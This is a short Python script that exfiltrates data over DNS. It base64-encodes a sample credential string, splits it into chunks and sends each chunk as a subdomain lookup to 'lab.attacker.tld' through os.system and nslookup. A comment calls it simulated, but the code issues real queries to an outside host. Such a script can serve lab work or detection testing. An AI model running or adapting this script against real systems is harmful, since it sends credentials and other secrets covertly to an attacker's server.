import os
import base64
import time

DOMAIN = "lab.attacker.tld"  # A dummy or actual DNS sinkhole domain

def exfiltrate(data):
    b64 = base64.urlsafe_b64encode(data.encode()).decode()
    chunks = [b64[i:i+20] for i in range(0, len(b64), 20)]
    for c in chunks:
        query = f"{c}.{DOMAIN}"
        print(f"[*] Simulated DNS request: {query}")
        os.system(f"nslookup {query} > nul 2>&1")
        time.sleep(1)

if __name__ == "__main__":
    sample_data = "username=admin&pass=secret123"
    exfiltrate(sample_data)
